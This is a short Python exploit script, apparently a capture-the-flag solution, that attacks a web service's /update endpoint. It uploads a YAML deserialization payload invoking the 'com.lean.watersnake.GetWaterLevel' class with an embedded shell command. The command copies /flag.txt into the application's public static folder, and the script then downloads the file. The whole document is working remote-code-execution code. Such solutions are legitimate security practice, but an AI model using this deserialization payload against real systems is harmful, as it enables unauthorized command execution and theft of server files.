import requests
import sys

url = sys.argv[1]
url_exec = f"http://{url}/update"
url_flag = f"http://{url}/flag.txt"

data = {
    "config": (
        None,
        '!!com.lean.watersnake.GetWaterLevel ["cp /flag.txt /app/build/resources/main/static/flag.txt"]'
    )
}

r = requests.post(url_exec, files=data)
print("[+] code executed successfully!")

r_flag = requests.get(url_flag)

print(r_flag.text)
